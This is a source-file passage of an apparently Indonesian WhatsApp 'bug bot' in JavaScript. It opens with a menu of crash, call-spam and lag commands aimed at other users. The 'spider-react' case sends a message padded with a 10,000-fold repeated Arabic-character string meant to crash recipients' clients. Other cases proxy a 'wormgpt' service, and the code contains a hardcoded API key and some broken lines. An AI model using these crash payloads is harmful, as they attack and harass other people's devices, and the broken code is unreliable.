 ➵ crashkah? [ Infinite Crash ]
 ➵ santet [ Infinite Crash ]
 ➵ activecall [ call 1 hit ]
 ➵ call1hit [ call 1 hit ]
 ➵ startcall [ call 1 hit ]
 ➵ newcall [ call 1 hit ]
 ➵ skedulbotak [ call 1 hit ]
 ➵ blowjobbug [ call 1 hit ]
 ➵ bugcall [ call 1 hit ]
 ➵ vcsbug [ End Call ]
 ➵ videocallsexbug [ End Call ]
 ➵ callend [ End Call ]
 ➵ skedulend [ End Call ]
 ➵ skedulpler [ End Call ]
 ➵ sprite+insto [ End Call ]
 ➵ tahutempe [ End Call ]
 ➵ sumenga [ End Call ]
 ➵ videocallgey [ End Call ]
 ➵ bugmullet [ End Call ]
 ➵ endcall [ End Call ]
 ➵ zxvkill [ Txt Crash Home ]
 ➵ zxvreadhome [ Txt Crash Home ] 
 ➵ zxvbug [ Txt Crash Home ] 
 ➵ zxv💀 [ Txt Crash Home ]
 ➵ atomic [ Txt Crash Home ]
 ➵ doti [ Txt Crash Home ]
 ➵ meledak [ Txt Crash Home ]
 ➵ crashbg? [ Txt Crash Home ]
 ➵ crashkak? [ Txt Crash Home ]
 ➵ crashin [ Txt Crash Home ]
 ➵ plerku [ Txt Crash Home ]
 ➵ aduhcrash [ Txt Crash Home ]
 ➵ duarrr [ Txt Crash Home ]
 ➵ bijimledak [ Txt Crash Home ]
 ➵ sipilis [ Txt Crash Home ]
 ➵ txtcrash [ Txt Crash Home ]
 ➵ deathinvite [ Inv Crash Home ] 
 ➵ porninvite [ Inv Crash Home ] 
 ➵ undanganbug [ Inv Crash Home ] 
 ➵ ngundangcrash [ Inv Crash Home ] 
 ➵ fckh? [ Inv Crash Home ] 
 ➵ bugtroli [ Troli Crash Home ]
 ➵ trolibit [ Troli Crash Home ]
 ➵ cartmap [ Troli Crash Home ]
 ➵ bitmapbug [ Troli Crash Home ]
 ➵ carrinho [ Troli Crash Home ]
 ➵ crashbitmap [ Troli Crash Home ]
 ➵ pixelcrash [ Troli Crash Home ]
 ➵ locmess [ Loc Crash Home ]
 ➵ serlok [ Loc Crash Home ]
 ➵ buglocation [ Loc Crash Home ]
 ➵ crashloc [ Loc Crash Home ]
 ➵ locgp linkGroup 
 ➵ buglocgc linkGroup
 ➵ locgc linkGroup
 ➵ gpcrash linkGroup
 ➵ angjqy linkGroup
 ➵ serlokgc linkGroup 
 ➵ buggc linkGroup 
 ➵ lag-gk? linkGroup 
 ➵ kok-lagya linkGroup 
 ➵ gp-bug linkGroup 
 ➵ ngelag-woi linkGroup 
 ➵ bugbokep linkGroup 
 ➵ get-attention linkGroup 
 ➵ hengsot linkGroup
 ➵ hedsot idgc
 ➵ mledak idgc
 ➵ teluhvagina idgc
 ➵ 1shoot idgc
 ➵ 1kill idgc
 ➵ akuruok idgc 
 ➵ buginvite Jumlah 
 ➵ bugprivchat Jumlah 
 ➵ bugchat Jumlah 
 ➵ aduhngelag🤣 Jumlah 
 ➵ hpkudipirtex Jumlah 
 ➵ bugchanel [ Invite Chanel ] 
 ➵ newsbug [ Invite Chanel ] 
 ➵ newsletterinvite [ Invite Chanel ] 
 ➵ chanelinvite [ Invite Chanel ] 
 ➵ newsinvite [ Invite Chanel ] 

      
           \`𝗕𝗬 𝗞𝗜𝗡𝗚 𝗦𝗔𝗠\`
    `
                let hiks = {
      image: menunya, 
      caption: itsmenu,
      gifPlayback: false,
      contextInfo:{externalAdReply:{
    title: '🕷️ 𝕾𝖕𝖎𝖉𝖊𝖗🕷️ 🕸️𝖂𝖊𝖇🕸️',
      body: `👤 名前 : ${m.pushName}`, 
      showAdAttribution: false,
      thumbnail:nulll2,
      mediaType: 4,
      MediaUrl:`${global.yt}`,
      sourceUrl:`${global.yt}`,
      }}
     }
await ryozingod.sendMessage(m.chat, hiks, {quoted: m })
await sleep(1000)
await ryozingod.sendMessage(m.chat, { audio: night, mimetype: 'audio/mpeg', ptt:true }, { quoted: m })
}
break

case 'sc': case 'script': {
xgreply(`𝒀𝒐𝒖 𝑪𝒂𝒏𝒕 𝒈𝒆𝒕 𝒕𝒉𝒊𝒔 𝑺𝒄𝒓𝒊𝒑𝒕 𝑺𝒐𝒓𝒓𝒚 𝑩𝒓𝒐 ⚚.

➻𝑪𝒉𝒆𝒄𝒌 𝑶𝒘𝒏𝒆𝒓 
➻𝑨𝒔𝒌 𝑯𝒊𝒎 𝒇𝒐𝒓 𝒉𝒆𝒍𝒑 🦉

🫲😂🫱 `)
}
break

case 'owner': case 'botowner':
let namaown = `𝐌𝐘 𝐎𝐖𝐍𝐄𝐑 𝐈𝐒 𝐊𝐈𝐍𝐆 𝐒𝐀𝐌`
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${namaown}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.Contributor}:+${global.Contributor}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ 🕷️ 𝕾𝖕𝖎𝖉𝖊𝖗🕷️ 🕸️𝖂𝖊𝖇🕸️ ༑ ]]\nX-WA-BIZ-NAME: [[ ༑ 𝐙.𝐱.𝐕 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`,
}
}), { userJid: m.chat, quoted: ryobug })
ryozingod.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break

case 'apa': {
if (!isPremium) return xgreply(mess.premium)
ryozingod.sendMessage(m.chat, { text: `apa?`}, { quoted: ryobug })
}
break

case 'spider-react': {
if (!isPremium) return xgreply(mess.premium)
if (!m.quoted) return xgreply(`Penggunaan .${command} reply pesan`)
await ryozingod.sendMessage(m.chat, { text: 'success 🕷️', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: '؂ن؃؄ٽ؂ن؃؄ٽ'.repeat(10000), serverMessageId: 2 } }}, { quoted: ryobug })
await sleep(2000)
await ryozingod.sendMessage(m.chat, { react: { text: '🕷️', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break

case 'woi': case 'deck': case 'dick': case 'dek': case 'bocil': case 'esempe': case 'cil': case 'cill': case 'pio': {
m.reply(`Harap yang sopan dalam memanggil orang, minimal mengatakan "Assalamu'alaikum warrahmatullahi Wabarakatuh" atau kalian bisa panggil Namanya. Tidak sopan itu, Jika *anda lebih tua* anda mengerti yang namanya etika.

islam: Assalamualaikum
kristen: Shalom
hindu: Swastyastu
buddha: Sotthi Jitu
konghucu: Wei De Dong Tian
Atheis/Gapunya Agama/Orang Gila: ${command}`)
}
break

case 'bug': case 'apa': case 'kenapa': case 'oke': case 'apa': case 'virtex': case 'virteks': case 'virtext': case 'pirtek': case 'pirteks': case 'pirtex': case 'anjay':{
if (!isPremium) return xgreply(mess.premium)
ryozingod.sendMessage(m.chat, { text: `kenapa?`}, { quoted: ryobug })
}
break

case 'shutdown': {
if (!isDeveloper) return xgreply(mess.owner)
inireact()
xgreply(`Bye 🫲🥺🫱`)
await sleep(5000)
process.exit()
}
break

case "totalcase": {
  inireact();
  if (!isDeveloper) return xgreply(mess.owner);
  let regex = /case\s+['"`]([^'"\`]+)['"`]\s*:/g;
  let match, caseNames = [];
  while ((match = regex.exec(fileContent)) !== null) {
    caseNames.push(match[1]);
  }

  let output = caseNames.length > 0 ? "• " + caseNames.join("\n• ") : "No cases found.";
  xgreply(`Total case : ${caseNames.length}\n\n${output}`);
}
break

case "getname": {
inireact()
if (q) {
try {
var name = d4tbs.users[q].name
} catch {
var name = await ryozingod.getName(q)
}
xgreply(name)
} else {
xgreply(m.pushName)
}
}
break
case "analyse": {
inireact()
if (!q) return xgreply (`Example : ${m.prefix + m.command} Reply to an Image to be analysed`)
var  = await fetch(`https://astica.ai/vision/describe-images/=${q}`) 
}
break
case "getpp": {
inireact()
if (Input) {
try {
var ppWong = await ryozingod.profilePictureUrl(Input, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
ryozingod.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
} else {
try {
var ppWong = await ryozingod.profilePictureUrl(m.sender, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
ryozingod.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
}
}
break
		
case'telestick': {
if (!isDeveloper) return xgreply(mess.owner)
inireact()
if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
let xeonresources = await Telesticker(args[0])
await xgreply(`Sending ${xeonresources.length} stickers...`)
if (m.isGroup && xeonresources.length > 30) {
await xgreply('Number of stickers more than 30, bot will send it in private chat.')
for (let i = 0; i < xeonresources.length; i++) {
ryozingod.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
}
} else {
for (let i = 0; i < xeonresources.length; i++) {
ryozingod.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
}
}
} else xgreply(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break

case 'join': {
if (!isDeveloper) return xgreply(mess.owner)
inireact()
if (!text) return xgreply('Masukkan Link Group!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return 'Link Invalid!'
xgreply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await ryozingod.groupAcceptInvite(result).then((res) => xgreply(jsonformat(res))).catch((err) => xgreply(jsonformat(err)))
}
break

case 'self': {
inireact()
if (!isDeveloper) return xgreply(mess.owner)
ryozingod.public = false
xgreply('succes')
}
break

case 'block':
inireact()
if (!isDeveloper) return xgreply(mess.owner);
if(isGroup){
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if(users){
await ryozingod.updateBlockStatus(users, "block")
xgreply(`Sukses block user`)
} else {
xgreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return xgreply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return xgreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await ryozingod.updateBlockStatus(woke, "block")
} else if(!q){
xgreply("Masukan nomer yang ingin di block")
}
xgreply(`Berhasil Block user ${woke.split("@")[0]}`)
}
break
case 'unblock':
inireact()
if (!isDeveloper) return xgreply(mess.owner);
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if(isGroup){
if(users){
await ryozingod.updateBlockStatus(users, "unblock")
await xgreply(`Sukses unblock user`)
} else if(!q){
xgreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return xgreply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return xgreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await ryozingod.updateBlockStatus(woke, "unblock")
xgreply(`Sukses unblock ${woke}`)
} else if(!q){
xgreply("Masukan nomer yang ingin di unblock")
}

}
break
case 'listblock':{
inireact()
let block = await ryozingod.fetchBlocklist()            
xgreply('List Block :\n\n' + `Total : ${block == undefined ? '*0* Diblokir' : '*' + block.length + '* Diblokir'}\n` + block.map(v => '• ' + v.replace(/@.+/, '')).join`\n`)
}
break
case 'setppbot':{
inireact()
if (!isDeveloper) return xgreply(mess.owner);
if(m.quoted){
const media = await ryozingod.downloadAndSaveMediaMessage(quoted)
const { img } = await generateProfilePicture(media)
await ryozingod.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})       
await xgreply(`${mess.success}`)    
} else xgreply("Reply fotonya")
}
break
case 'delppbot': {
inireact()
if (!isDeveloper) return xgreply(mess.owner);
ryozingod.removeProfilePicture(ryozingod.user.id)
xgreply(mess.succes)
}
break
case 'setbiobot':{
inireact()
if (!isDeveloper) return xgreply(mess.owner);
if (!q) return xgreply(`Kirim perintah ${prefix+command} nama\n\nContoh : ${command} Paijo`)
await ryozingod.updateProfileStatus(q)
await xgreply(`Berhasil mengganti status bio ke *${q}*`)
}
break

case 'listpc': {
inireact()
if (!isDeveloper) return xgreply(mess.owner);
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*Private Chat*\nTotal: ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${pushname}\n*User :* @${sender.split('@')[0]}\n*Chat :* https://wa.me/${sender.split('@')[0]}\n\n───────────\n\n`
}
xgreply(teks)
}
break
case "addcase": {
  inireact()
  if (!isDeveloper) return xgreply(mess.owner);
  if (!q) return xgreply(`Masukan Input`);
  if (!q.includes("|")) return xgreply("Format perintah tidak valid. Gunakan: addcase <tempat>|case \"casenya\">{ ... } break")

  let tempat = q.split("|")[0];
  let casenya = q.split("|")[1];
  let newCase = casenya

  let fileContent = fs.readFileSync("./ryozingod", "utf-8");

  let breakIndex = fileContent.indexOf(`break\n`, fileContent.indexOf(`case "${tempat}":`));

  if (breakIndex !== -1) {
    fileContent = fileContent.slice(0, breakIndex + 6) + newCase + fileContent.slice(breakIndex + 6);

    fs.writeFileSync("./ryozingod", fileContent, "utf-8");

    xgreply(`Case baru "${casenya}" berhasil ditambahkan di bawah case "${tempat}"!`);
  } else {
    xgreply(`Tidak dapat menemukan break di case "${tempat}".`);
  }
}
break

case "delcase": {
  inireact()
  if (!isDeveloper) return xgreply(mess.owner);
  if (!q) return xgreply("Masukkan nama case yang ingin dihapus, contoh: delcase gpt4");

  let caseName = q

  let fileContent = fs.readFileSync("./ryozingod", "utf-8");

  let startIndex = fileContent.indexOf(`case "${caseName}"`);
  let endIndex = fileContent.indexOf("break", startIndex);

  if (startIndex !== -1 && endIndex !== -1) {
    let caseToDelete = fileContent.slice(startIndex, endIndex + 6);
    fileContent = fileContent.replace(caseToDelete, "");

    fs.writeFileSync("./ryozingod", fileContent, "utf-8");

    xgreply(`Case "${caseName}" berhasil dihapus!`);
  } else {
    xgreply(`Tidak dapat menemukan case "${caseName}" untuk dihapus.`);
  }
}
break

case 'iniryo' : {
inireact()
ryozingod.sendMessage(m.chat, { text: `_ryo itu ganteng banget, aku jdi suka ama dia 😣😖😫_` }, { quoted: m })
}
break

case "emojimix": {
inireact()
let [emoji1, emoji2] = text.split`+`
if (!emoji1) return xgreply(`*Example: ${prefix+command} 😅 + 🤔*`)
if (!emoji2) return xgreply(`*Example: ${prefix+command} 😅 + 🤔*`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await ryozingod.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
case "emojimix2": {
inireact()
if (!text) return xgreply(`*Example: ${prefix+command} 😅*`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await ryozingod.sendImageAsSticker(m.chat, res.url, m, { packname: pushname, author: author, categories: res.tags })
await fs.unlinkSync(encmedia);
}
}
break

//Convert 
case 'style': case 'styletext': {
inireact()
let { styletext } = require('./lib/scraper')
if (!text) return xgreply('Enter Query text!')
let anu = await styletext(text)
let teks = `Style Text From ${text}\n\n`
for (let i of anu) {
teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
}
xgreply(teks)
}
break
		
case'sticker':
case 's':
case 'stiker':
case 'st':{
inireact()
if (!quoted) return xgreply(`Balas Video/Image Dengan Caption ${prefix + command}`)
xgreply(mess.wait)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await ryozingod.sendImageAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return xgreply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await ryozingod.sendVideoAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else {
return xgreply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break



case 'smeme': {
inireact()
 if (!text) return xgreply(`Balas Image Dengan Caption ${prefix + command}`)
if (!quoted) return xgreply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
xgreply(mess.wait)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await ryozingod.downloadAndSaveMediaMessage(qmsg)
let Bjirka = await uptotelegra(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${Bjirka}`
let pop = await ryozingod.sendImageAsSticker(m.chat, smeme, m, {
packname: global.packname,
author: global.author
})
fs.unlinkSync(pop)
}
}
break
		

case 'toimage':
case 'toimg': {
inireact()
if (!/webp/.test(mime)) return xgreply(`Reply sticker dengan caption *${prefix + command}*`)
xgreply(mess.wait)
let media = await ryozingod.downloadAndSaveMediaMessage(qmsg)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
ryozingod.sendMessage(m.chat, {
image: buffer
}, {
quoted: m
})
fs.unlinkSync(ran)
})

}
break
case 'tomp4':
case 'tovideo': {
inireact()
if (!/webp/.test(mime)) xgreply(`xgreply stiker dengan caption *${prefix + command}*`)
xgreply(mess.wait)
let media = await ryozingod.downloadAndSaveMediaMessage(qmsg)
let webpToMp4 = await webp2mp4File(media)
await ryozingod.sendMessage(m.chat, {
video: {
url: webpToMp4.result,
caption: 'Convert Webp To Video'
}
}, {
quoted: m
})
await fs.unlinkSync(media)

}
break
case 'toaud':
case 'toaudio': {
inireact()
if (!/video/.test(mime) && !/audio/.test(mime)) return xgreply(`Kirim/xgreply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
xgreply(mess.wait)
let media = await ryozingod.downloadMediaMessage(qmsg)
let audio = await toAudio(media, 'mp4')
ryozingod.sendMessage(m.chat, {
audio: audio,
mimetype: 'audio/mpeg'
}, {
quoted: m
})

}
break
case 'removebg': {
inireact()
if (!quoted) return xgreply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
xgreply(mess.wait)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await ryozingod.downloadAndSaveMediaMessage(qmsg)
let bjirka = await uptotelegra(dwnld)
var anu = await fetchJson(`https://aemt.me/removebg?url=${bjirka}`)
var hassdl = anu.url.result
await ryozingod.sendMessage(m.chat, {
image: {
url: hassdl,
caption: 'Succes Sayang UwU'
}
}, {
quoted: m
})
}
}
break
case 'attp':{
inireact()
 if (!text) return xgreply(`❗Gagitu Bego, Nih Gw Ajarin\n${prefix + command} RyoCakep`)
let lubangtile = `https://aemt.me/attp?text=${q}`
await ryozingod.sendVideoAsSticker(m.chat, lubangtile, m, {
packname: global.packname,
author: global.author
})
}
break
case "tinyurl": case "shortlink": {
inireact()
if (!text) return xgreply(`*Example: ${prefix+command} https://instagram.com/ryozingod*`)
let anu = await axios.get(`https://tinyurl.com/api-create.php?url=${text}`)
xgreply(anu.data)
}
break
case 'remini': case 'hd': case 'hdr': {
inireact()
if (!quoted) return xgreply(`Fotonya Mana?`)
if (!/image/.test(mime)) return xgreply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
xgreply(mess.wait)
let media = await quoted.download()
let proses = await remini(media, "enhance");
ryozingod.sendMessage(m.chat, { image: proses, caption: '_Maaf Kak, Kalau Hasilnya Nggak Bagus_ T_T'}, { quoted: m })
}
break
case 'git': case 'gitclone': {
inireact()
    if (!args[0]) return xgreply(`Mana link nya?\nContoh :\n${prefix ? prefix : '.'}${command} https://github.com/YukiShima4/tes`)
    if (!isUrl(args[0]) && !args[0].includes('github.com')) return xgreply(`Link invalid!!`)
    await xgreply(mess.wait)
    let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    ryozingod.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => xgreply(err))
}       
break

case 'mediafire': {
if (!text) return xgreply(`Gunakan dengan cara ${prefix + command} *url*`)
inireact()
xgreply(mess.wait)
let anu = await fetchJson(`https://aemt.me/mediafire?link=${q}`)
let hasdl = anu.result.link
let namafile = anu.result.title
ryozingod.sendMessage(m.chat, { document: { url: hasdl }, mimetype: 'application/zip', fileName: namafile }, { quoted: m })
}
break

case 'igdlmp4': {
  if (!text) return xgreply(`Gunakan dengan cara ${prefix + command} *url*`)
  inireact()
  xgreply(mess.wait)
  var anu = await fetchJson(`https://aemt.me/download/igdl?url=${q}`)
  var hassdl = anu.result[0].url
  await ryozingod.sendMessage(m.chat, {
    video: {
      url: hassdl,
      caption: 'Succes Sayang UwU'
    }
  }, {
    quoted: m
  })
}
break

case 'igdlimage': {
if (!text) return xgreply(`Gunakan dengan cara ${prefix + command} *url*`)
inireact()
xgreply(mess.wait)
var anu = await fetchJson(`https://aemt.me/download/igdl?url=${q}`)
var hassdl = anu.result.url
await ryozingod.sendMessage(m.chat, {
image: {
url: hassdl,
caption: 'Succes Sayang UwU'
}
}, {
quoted: m
})
}
break

case 'pintmp4': {
if (!text) return xgreply(`Gunakan dengan cara ${prefix + command} *url*`)
inireact()
xgreply(mess.wait)
var anu = await fetchJson(`https://aemt.me/download/pindl?url=${q}`)
var hassdl = anu.result.url
await ryozingod.sendMessage(m.chat, {
video: {
url: hassdl,
caption: 'Succes Sayang UwU'
}
}, {
quoted: m
})
}
break

case 'douyindl': {
if (!text) return xgreply(`Gunakan dengan cara ${prefix + command} *url*`)
inireact()
xgreply(mess.wait)
var anu = await fetchJson(`https://aemt.me/download/douyin?url=${q}`)
var hassdl = anu.result.url.nowm
await ryozingod.sendMessage(m.chat, {
video: {
url: hassdl,
caption: 'Succes Sayang UwU'
}
}, {
quoted: m
})
}
break

case 'happymod':{
if (!q) return xgreply(`Example ${prefix+command} Sufway surfer mod`)
xgreply (mess.wait)
let kat = await scp1.happymod(q)
xgreply (util.format(kat))
}
break

case 'play': 
case 'ytaudio':
case 'playmusik':
case 'playmusic': {
if (!q) return xgreply("Kirim perintah judul lagu/link youtube nya bwang")
try {
let rus = await yts(q)
if (rus.all.length == "0") return xgreply("Video tidak bisa di download")
let data = await rus.all.filter(v => v.type == 'video')
try{
var res = data[0]
var info = await ytdl.getInfo(res.url);
} catch{
var res = data[1]
var info = await ytdl.getInfo(res.url);
}
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
try{
var thumbnya = `https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`
} catch(err) {
var thumbnya = `https://i.ytimg.com/vi/${res.videoId}/default.jpg`
}
let inithumb = await getBuffer(thumbnya)
let teks = `❍ 𝗦𝗣𝗜𝗗𝗘𝗥 𝗠𝗨𝗦𝗜𝗖 𝗛𝗨𝗕 ❍
━━━━━━━━━━━━━━━━

➢ 𝐒𝐎𝐍𝐆 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄𝐃 𝐁𝐘 :  𝐒𝐏𝐈𝐃𝐄𝐑 𝐁𝐎𝐓 
➢ 𝐁𝐎𝐓 𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘 :  𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 
➢ 𝐒𝐎𝐍𝐆 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 : ${res.timestamp}

━━━━━━━━━━━━━━━━━
     ❖ 𝗘𝗡𝗝𝗢𝗬 𝗬𝗢𝗨𝗥 𝗠𝗨𝗦𝗜𝗖 ❖`

ryozingod.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: false, 
title: `${res.title}`,
body: `${week} ${calender}`,																													
mediaType: 2,  
renderLargerThumbnail : true,
thumbnail: inithumb,
mediaUrl: res.url,
sourceUrl: res.url
}}, image: {url: inithumb},text: teks},{quoted: m})                                        
downloadMp3(`${res.url}`) 
} catch (err){
console.log(err)
xgreply(`Server sedang error`)
}
}
break

case 'ytmp3':
case 'youtubemp3':
case 'youtubeaudio':{
    inireact()
    if(!q) return xgreply(`Contoh : ${prefix+command} Link`)
    await xgreply(mess.wait)
    downloadMp3(text)
}
break
case 'ytmp4':
case 'youtubevideo':
case 'youtubemp4':{
    inireact()
    if(!q) return xgreply(`Contoh : ${prefix+command} Link`)
    await xgreply(mess.wait)
    downloadMp4(text)
}
break
case 'tiktok':
case 'tiktokvideo': {
inireact()
    if (!text) return xgreply( `Contoh : ${prefix + command} link`)
    if (!q.includes('tiktok')) return xgreply(`Link Invalid!!`)
    await xgreply(mess.wait)
    require('./lib/tiktok').Tiktok(q).then( data => {
        ryozingod.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: m })
    })
}
break

case 'tiktokmp3':
case 'tiktokaudio': {
inireact()
    if (!text) return xgreply( `Example : ${prefix + command} link`)
    if (!q.includes('tiktok')) return xgreply(`Link Invalid!!`)
    await xgreply(mess.wait)
    require('./lib/tiktok').Tiktok(q).then( data => {
        ryozingod.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
    })
}
break


case 'wm': {
inireact()
    let [teks1, teks2] = text.split`|`
    //if (!teks1) return xgreply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
    //if (!teks2) return xgreply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
	xgreply(mess.wait)
    if (/image/.test(mime)) {
        let media = await ryozingod.downloadMediaMessage(quoted)
        let encmedia = await ryozingod.sendImageAsSticker(m.chat, media, m, { packname: `${teks1 ? teks1 : global.packname}`, author: `${teks2 ? teks2 : global.author}`  })
            } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return xgreply('Maksimal 10 detik!')
        let media = await ryozingod.downloadMediaMessage(qmsg)
        let encmedia = await ryozingod.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
            } else {
        return xgreply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
    }
}
break

case "kalkulator":{
if (text.split("+")[0] && text.split("+")[1]) {
const nilai_one = Number(text.split("+")[0])
const nilai_two = Number(text.split("+")[1])
xgreply(`${nilai_one + nilai_two}`)
} else if (text.split("-")[0] && text.split("-")[1]) {
const nilai_one = Number(text.split("-")[0])
const nilai_two = Number(text.split("-")[1])
xgreply(`${nilai_one - nilai_two}`)
} else if (text.split("×")[0] && text.split("×")[1]) {
const nilai_one = Number(text.split("×")[0])
const nilai_two = Number(text.split("×")[1])
xgreply(`${nilai_one * nilai_two}`)
} else if (text.split("÷")[0] && text.split("÷")[1]) {
const nilai_one = Number(text.split("÷")[0])
const nilai_two = Number(text.split("÷")[1])
xgreply(`${nilai_one / nilai_two}`)
} else xgreply(`*Example* : ${prefix + command} 1 + 1`)
}
break

    //Openai
case "ai": case "chatgpt": case "openai": {
inireact()
if (!q) return xgreply (`Example : ${m.prefix + m.command} create code html & css for hack NASA`)
var js = await fetch(`https://aemt.me/openai?text=${q}`) 
var json = await js.json()
xgreply(json.result)
}
break
case "gpt4": {
inireact()
if (!q) return xgreply (`Example : ${m.prefix + m.command} create code html & css for hack NASA`)
var js = await fetch(`https://aemt.me/gpt4?text=${q}`) 
var json = await js.json()
xgreply(json.result)
}
break
case 'wormgpt': {
inireact()
if (!q) return xgreply (`Example : ${m.prefix + m.command} create code html & css for hack NASA`)
let response = await axios.post('https://wrmgpt.com/v2/chat/completions', {
    messages: [{ role: 'user', content: q }],
    max_tokens: 820,
}, { headers: { 'x-wormgpt-provider': 'worm_gpt', 'Content-Type': 'application/json' } });

xgreply(response.data.choices[0].message.content);
}
break
case 'txt2img':{
inireact()
if (!text) throw xgreply('Masukan Promptnya\nExample:\n1girl, with glasses, in beach')
xgreply(`Proses Ayang`)
try {
let txt = await getBuffer(`https://xzn.wtf/api/txt2img?text=${text}&apikey=${api.skijo}`)
await ryozingod.sendMessage(m.chat, {image: txt, caption: `Done Sayang`},{quoted: m})
     } catch (e) {
xgreply('Gagal Convert Gambar') 
}
}
break
case 'diffusion': case 'stabledif': case 'diff':{
if (!text) throw xgreply(`Masukan Promptnya\nExample:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`)
xgreply(mess.wait)
